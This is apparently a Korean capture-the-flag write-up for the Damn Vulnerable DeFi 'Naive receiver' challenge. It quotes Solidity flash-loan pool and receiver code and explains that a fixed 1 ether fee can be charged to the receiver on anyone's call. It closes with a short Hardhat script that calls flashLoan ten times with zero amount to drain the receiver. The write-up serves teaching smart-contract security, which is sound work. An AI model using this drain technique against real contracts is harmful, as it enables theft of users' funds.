---
title: "DamnVulnerableDefi Naive receiver 풀이"
author: Grizzly
categories:
  - Wargame
tags:
  - DamnVulnerableDefi
  - NaiveReceiver

sitemap :
changefreq : daily
priority : 1.0
# table of contents
toc: true # 오른쪽 부분에 목차를 자동 생성해준다.
toc_label: "table of content" # toc 이름 설정
toc_icon: "bars" # 아이콘 설정
toc_sticky: true # 마우스 스크롤과 함께 내려갈 것인지 설정
---

## Overview
`Unstoppable`에 이은 Damn Vulnerable Defi 워게임의 2번째 문제이다. 
(하지만, 여느 워게임이 그렇듯 문제간 연관성은 없다;P)

첫 번째 문제에 서술되어 있듯이, 이 워게임에서 제공되는 문제들은 `Solidity`로 작성된 스마트 컨트랙트 파일(들)과 `Javascript`로 작성된 익스플로잇 코드 템플릿을 제공한다. 익스플로잇 코드 템플릿은 `Hardhat`과 `Waffle` 프레임워크로 작성되어 크게 템플릿 코드가 크게 `before`, `it`, `after`로 구분된다. `before` 파트는 문제의 스마트 컨트랙트를 배포하고 초기 자본(?) 설정 등과 같은 초기화를 담당한다. `it` 파트에는 스마트 컨트랙트를 익스플로잇하기 위한 코드가 위치하며, 플레이어가 작성할 수 있도록 비워져있다. 마지막으로, `after` 파트에는 문제의 달성 조건이 작성되어있다. 

워게임 플레이어는 스마트 컨트랙트와 익스플로잇 코드의 after 파트를 확인해서, 문제의 방향을 확인해야 한다.
(물론, 워게임 [사이트](https://www.damnvulnerabledefi.xyz/)에도 글로 잘 작성되어 있다.)

본론으로 들어가서, 이 문제에서는 2개의 스마트 컨트랙트(`FlashLoanReceiver.sol`, `NaiveReceiverLenderPool.sol`)가 주어진다. `NaiveRecevierLenderPool`은 flashLoan 서비스를 제공하는 컨트랙트이고, 초기 자본 `1000 ether`를 가지고 있다. `FlashLoanReceiver`는 대출을 받는 컨트랙트이고, 초기 자본 `10 ehter`를 가지고 있다. 이 문제의 목표는 ***flashLoan 서비스를 통해 `NaiveReceiverLenderPool`이 `FlashLoanReceiver`가 가진 `10 ether`를 모두 가져가게 만드는 것이 목표다.***

## 컨트랙트 분석
사실 분석이라고 할 것까지도 없는 민망한 컨트랙트이지만, 제공된 2개의 컨트랙트의 기능을 확인해본다.

### NaiveReceiverLenderPool

~~~
    ...
    function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");


        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        borrower.functionCallWithValue(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            ),
            borrowAmount
        );
        
        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }
    ...
~~~
가장 중요한 `flashLoan` 함수만 보면, 
1. 대출자의 주소(`borrower`)와 대출금액(`borrowAmount`)을 매개변수로 전달받아, 
2. 대출 전 잔액인 `balanceBefore`가 `borrowAmount`보다 크면, 
3. `borrower`(컨트랙트)의 `receiveEther` 함수를 호출한다. 
4. `receiveEther` 함수 호출시, 고정 수수료(`FIXED_FEE`)를 매개변수로 전달하고, trasaction value로 `borrowAmount`를 전달한다. 
5. 마지막으로, 상환된 금액을 체크한다. 
   
전체 컨트랙트 코드를 보면 알 수 있자만, `FIXED_FEE`는 `1 ether`로 설정되어 있다.

### FlashLoanReceiver

~~~
    ...
    // Function called by the pool during flash loan
    function receiveEther(uint256 fee) public payable {
        require(msg.sender == pool, "Sender must be pool");

        uint256 amountToBeRepaid = msg.value + fee;

        require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");
        
        _executeActionDuringFlashLoan();
        
        // Return funds to pool
        pool.sendValue(amountToBeRepaid);
    }
    ...
~~~
여기에서도 `receiveEther` 함수만 살펴본다. 
1. 이 함수는 수수료(`fee`)를 매개변수로 전달받아, 
2. `msg.sender`가 `NaiveReceiverLenderPool` 컨트랙트인지 확인한다. 
3. 상환 금액인 `amountToBeRepaid`을 `msg.value`와 `fee`의 합으로 계산하고,
4. `amountToBeRepaid`가 현재 잔액 이하인 경우,
5. 대출금을 사용하는 `_executeActionDuringFlashLaon` 함수를 실행하고 (이 문제에서는 아무런 동작도 하지 않음),
6. `amountToBeRepaid`만큼 `NaiveReceiverLenderPool`에 상환한다.

## Solution
이 문제는 너무 쉬워서 풀이라 할 것도 없다... `FlashLoanReceiver`가 얼마를 대출하던 항상 수수료로 `1 ether`가 지출되기 떄문에 대출금을 `0`으로 설정하고 `flashLoan` 함수를 `10`번 호출하면, `FlashLoanReceiver`의 자본 `10 ether`를 모두 소진하게 된다.

~~~
    ...
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */   
        for (var i = 0;i < 10;++i) {
            await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
        }
    });
    ...
~~~

***EZ***

## References

* Damn Vulnerable DeFi-Naive receiver, https://www.damnvulnerabledefi.xyz/challenges/2.html